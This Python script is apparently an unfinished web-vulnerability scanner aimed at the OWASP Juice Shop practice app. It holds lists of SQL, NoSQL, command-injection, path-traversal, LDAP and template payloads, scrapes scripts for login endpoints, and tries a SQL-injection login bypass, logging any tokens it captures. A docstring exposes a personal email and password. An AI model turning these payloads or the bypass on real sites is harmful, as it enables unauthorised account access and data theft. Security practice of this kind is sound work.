'''
Juice shop login info:
Email: Joseph.dimartino1207@gmail.com
Password: Password1!
'''
import requests
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import re
import ai_analysis
from selenium import webdriver  # Javascript
from selenium.webdriver.common.by import By

injections = {
    "SQL Injection": [
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "admin' --",
        "' UNION SELECT NULL,NULL--",
        "' AND SLEEP(5)--"
    ],
    "NoSQL Injection": [
        '{"$ne": null}',
        '{"$gt": ""}',
        "email[$ne]=",
        "email[$regex]=.*"
    ],
    "Command Injection": [
        "; ls",
        "&& whoami",
        "| id",
        "$(whoami)",
        "`whoami`"
    ],
    "Path Traversal": [
        "../../../../etc/passwd",
        "..%2F..%2F..%2Fetc/passwd",
        "..\\..\\..\\..\\windows\\win.ini"
    ],
    "LDAP Injection": [
        "*)(uid=*))(|(uid=*",
        "*)(|(mail=*))"
    ],
    "Template Injection": [
        "{{7*7}}",
        "<%= 7*7 %>",
        "${7*7}"
    ],
    "Header Injection": [
        "' OR 1=1--",
        "127.0.0.1"
    ]
}


def fetchInfo(url: str):
    s = requests.Session()
    r = s.get(url, allow_redirects=True, timeout=15)
    login_endpoints = []

    # --- Detect tech stack ---
    # print(r.headers)  # The header would usually have {"server" : "something"} or {"X-Powered-By": "something"}
    powered_by = r.headers.get("X-Powered-By", "")
    techs = []

    if "php" in powered_by.lower() or ".php" in r.text.lower():
        techs.append("PHP")
    if "express" in powered_by.lower():
        techs.append("Express (Node.js)")
    if "next.js" in powered_by.lower() or "/_next/" in r.text.lower():
        techs.append("Next.js")
    if "spring" in powered_by.lower() or ".jsp" in r.text.lower():
        techs.append("Java (Spring/JSP)")

    # BeautifulSoup to parse through the HTML
    soup = BeautifulSoup(r.text, "html.parser")

    #injectable_fields = []  # list of all injectable fields
    #for field in soup.find_all(["input", "textarea"]):
    #    name = field.get("name")
    #    if name:
    #        injectable_fields.append(name)

    script_list = [tag["src"] for tag in soup.find_all("script") if tag.get("src")]  # list of all scripts
    for script in script_list:
        full_url = urljoin(url, script)
        js = s.get(full_url).text

        API_REGEX = r"/(?:rest|api|v\d+)/[a-zA-Z0-9_/]+"
        matches = re.findall(API_REGEX, js)
        for m in matches:
            if any(word in m.lower() for word in ["login", "auth", "signin"]):
                login_endpoints.append(m)

    return login_endpoints, s


# Notes: Add a time stamp as well?
# Crop better?
def writeTXT(payload, headers, resp, type="GENERIC INPUT", auth=None):  # this method here will write to responses.txt
    if isinstance(resp, str):
        resp = resp[:300] + ("..." if len(resp) > 100 else "")
    elif isinstance(resp, dict):
        resp = {k: (v[:300] + "..." if isinstance(v, str) and len(v) > 100 else v)
                for k, v in resp.items()}

    if auth:  # prevent really long tokens being added
        if isinstance(auth, str) and len(auth) > 50:
            auth = auth[:50] + "..."
    with open("responses.txt", "a") as f:
        f.write(f'== {type} ATTEMPT ==\n')
        f.write(f'Payload: {payload}\n')
        f.write(f'Headers: {headers}\n')
        f.write(f'Response: {resp}\n')
        if auth:
            f.write(f'Auth: {auth}\n')
        f.write("\n")

    return


def login(email, password, endpoints, s, base_url):  # login automatically (either injection or with credentials)
    payload = {"email": email, "password": password}

    header_options = [
        ("application/x-www-form-urlencoded", "data"),
        ("application/json", "json"),
        ("multipart/form-data", "files"),
    ]

    for ep in endpoints:  # loop to find the correct endpoint (example localhost:3030/login.php)
        url = urljoin(base_url, ep)

        for ctype, method in header_options:
            headers = {"Content-Type": ctype}
            # This Next.js app will have a json response, also React, Angular, Vue, Flask, SpringBoot
            # form data being sent (can be php, .NET, java, basic HTML)
            if method == "json":
                r = s.post(url, json=payload, headers=headers)
            elif method == "data":
                r = s.post(url, data=payload, headers=headers)
            elif method == "files":
                r = s.post(url, files=payload, headers=headers)

            if r.status_code in [200, 302, 401, 403]:
                try:
                    resp = r.json()
                except ValueError:
                    resp = r.text[:500]  # just grab a snippet of HTML

                if isinstance(resp, dict) and "authentication" in resp:
                    token = resp["authentication"].get("token")
                    writeTXT(payload, headers, resp, type="LOGIN", auth=token)
                    return token
                elif "Set-Cookie" in r.headers:
                    cookies = r.cookies.get_dict()
                    writeTXT(payload, headers, resp, type="LOGIN", auth=cookies)
                    return cookies
                else:
                    writeTXT(payload, headers, resp, type="LOGIN")
                    return None

    return None


def inject():
    return


def parseSite():
    return


def main():
    ap = argparse.ArgumentParser(description="Juice Shop")
    ap.add_argument("base_url", help="e.g. http://localhost:3030/#/")
    ap.add_argument("--email", help="Email for login (optional)")
    ap.add_argument("--password", help="Password for login (optional)")
    args = ap.parse_args()
    BASE_URL = args.base_url

    login_endpoints, session = fetchInfo(BASE_URL)

    if args.email and args.password:
        # Normal login
        login(args.email, args.password, login_endpoints, session, BASE_URL)
    else:
        # Injection login
        login("' OR 1=1--", "THISDOESNTMATTER123", login_endpoints, session, BASE_URL)

    # ai_analysis.main()


if __name__ == "__main__":
    main()
